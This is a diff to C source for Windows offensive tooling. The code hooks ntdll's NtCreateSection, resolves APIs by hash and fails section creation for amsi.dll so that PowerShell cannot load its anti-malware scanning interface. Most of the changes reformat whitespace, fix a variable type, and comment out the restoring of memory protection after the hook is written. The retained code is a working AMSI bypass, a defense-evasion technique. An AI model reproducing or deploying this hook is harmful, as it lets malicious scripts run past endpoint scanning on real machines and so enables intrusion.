@@ -54,7 +54,7 @@ __stdcall NTSTATUS restore_hook_ntcreatesection(HANDLE* hSection, ACCESS_MASK De
 
     myNtCreateSection NtCreate;
     NtCreate = (myNtCreateSection)_ntCreateSection_address;
-    var ProtectPointer = NtCreate;
+    myNtCreateSection ProtectPointer = NtCreate;
     DWORD written2;//, written3;
     SIZE_T syscallSize = (SIZE_T)24;
  
@@ -174,18 +174,18 @@ void __attribute__((noinline)) log_to_file(PWCHAR input) {
         NULL,
         0);
 
-    if (status != 0) {
-        status = ((NTCREATEFILE)_NtCreateFile)(&file_handle, FILE_APPEND_DATA | SYNCHRONIZE, &obj_attributes, &io_status, NULL,
-            FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, 3/*FILE_OPEN_IF*/, 0x00000020/*FILE_SYNCHRONOUS_IO_NONALERT*/,
-            NULL,
-            0);
-    }
+if (status != 0) {
+    status = ((NTCREATEFILE)_NtCreateFile)(&file_handle, FILE_APPEND_DATA | SYNCHRONIZE, &obj_attributes, &io_status, NULL,
+        FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, 3/*FILE_OPEN_IF*/, 0x00000020/*FILE_SYNCHRONOUS_IO_NONALERT*/,
+        NULL,
+        0);
+}
 
-    // actually write into that file
-    UNICODE_STRING input_string;
-    ((RTLINITUNICODESTRING)_RtlInitUnicodeString)(&input_string, input);
-    ((NTWRITEFILE)_NtWriteFile)(file_handle, NULL, NULL, NULL, &io_status, input_string.Buffer, input_string.Length, NULL, NULL);
-    ((NTCLOSE)_NtClose)(file_handle);
+// actually write into that file
+UNICODE_STRING input_string;
+((RTLINITUNICODESTRING)_RtlInitUnicodeString)(&input_string, input);
+((NTWRITEFILE)_NtWriteFile)(file_handle, NULL, NULL, NULL, &io_status, input_string.Buffer, input_string.Length, NULL, NULL);
+((NTCLOSE)_NtClose)(file_handle);
 }
 
 // A function, that does the same as GetFinalPathNameByHandleA. It takes a Handle, a char array and a length as input and returns the path of the file in the char array. This can be done with the ntdll NtQueryInformationFile
@@ -197,34 +197,34 @@ BOOL __attribute__((noinline)) my_GetFinalPathNameByHandleA(HANDLE hFile, char* 
     uint64_t _NtQueryInformationFile = getFunctionPtr(HASH_NTDLL, HASH_NTQUERYINFORMATIONFILE);
     uint64_t _RtlUnicodeToMultiByteN = getFunctionPtr(HASH_NTDLL, HASH_RTLUNICODETOMULTIBYTEN);
     if (_NtQueryInformationFile == 0 || _RtlUnicodeToMultiByteN == 0)
-	{
-		return FALSE;
-	}
-	else
-	{
-		char buffer[0x1000];
-		FILE_NAME_INFORMATION* nameInfo = (FILE_NAME_INFORMATION*)buffer;
-		IO_STATUS_BLOCK ioStatusBlock;
-		NTSTATUS status = ((NTQUERYINFORMATIONFILE)_NtQueryInformationFile)(hFile, &ioStatusBlock, nameInfo, 0x1000, FileNameInformation);
-        
-		if (status == 0)
-		{
-            
+    {
+        return FALSE;
+    }
+    else
+    {
+        char buffer[0x1000];
+        FILE_NAME_INFORMATION* nameInfo = (FILE_NAME_INFORMATION*)buffer;
+        IO_STATUS_BLOCK ioStatusBlock;
+        NTSTATUS status = ((NTQUERYINFORMATIONFILE)_NtQueryInformationFile)(hFile, &ioStatusBlock, nameInfo, 0x1000, FileNameInformation);
+
+        if (status == 0)
+        {
+
             ULONG size = 0;
             ((RTLUNICODETOMULTIBYTEN)_RtlUnicodeToMultiByteN)(path, length, &size, nameInfo->FileName, nameInfo->FileNameLength);
             path[size] = 0;
-            
+
             return TRUE;
-		}
-		else
-		{
+        }
+        else
+        {
             wchar_t log[] = { '\r','\n','[','*',']',' ','F','a','i','l','e','d',' ','t','o',' ','q','u','e','r','y',' ','f','i','l','e',' ','i','n','f','o','!','\0' };
             PWCHAR first = (PWCHAR)&log;
             log_to_file(first);
-			
+
             return FALSE;
-		}
-	}
+        }
+    }
 }
 
 
@@ -248,7 +248,7 @@ __stdcall NTSTATUS ntCreateMySection(HANDLE* hSection, ACCESS_MASK DesiredAccess
     else
     {
         // increase the value of firstRun by once
-		increaseChar((char*)firstRun);
+        increaseChar((char*)firstRun);
     }
     */
 
@@ -259,7 +259,7 @@ __stdcall NTSTATUS ntCreateMySection(HANDLE* hSection, ACCESS_MASK DesiredAccess
         if (my_GetFinalPathNameByHandleA(FileHandle, (char*)lpFilename, 256) != 0)
         {
 
-            char amsiShort[] = /*amsi.dll */{ 'a', 'm', 's', 'i', '.', 'd', 'l', 'l', 0 };  
+            char amsiShort[] = /*amsi.dll */{ 'a', 'm', 's', 'i', '.', 'd', 'l', 'l', 0 };
 
             if (StrStrIA((char*)lpFilename, (char*)amsiShort))
             {
@@ -271,6 +271,7 @@ __stdcall NTSTATUS ntCreateMySection(HANDLE* hSection, ACCESS_MASK DesiredAccess
                 return 0xC0000054; // 0 does not work here, as Powershell than tries to use AMSI and the process crashes. So we're using STATUS_FILE_LOCK_CONFLICT to inform about the Section wasn't creatable.
 
             }
+            
         }
     }
     // we are going to return the NTSTATUS of the original function afterwards
@@ -308,7 +309,7 @@ BOOL hook_ntcreateSection()
     
     my_memcpy((LPVOID*)NtCreate, &trampoline_MyNtCreateSection, sizeof trampoline_MyNtCreateSection); // actually do the hook by overwriting the original NtCreateSection
 
-    ((NTPROTECTVIRTUALMEMORY)_NtProtectVirtualMemory)((HANDLE)-1, (PVOID)&NtCreate, (PULONG)&syscallSize, PAGE_EXECUTE_READ, &written);
+    //((NTPROTECTVIRTUALMEMORY)_NtProtectVirtualMemory)((HANDLE)-1, (PVOID)&NtCreate, (PULONG)&syscallSize, PAGE_EXECUTE_READ, &written);
 
 
     return TRUE;
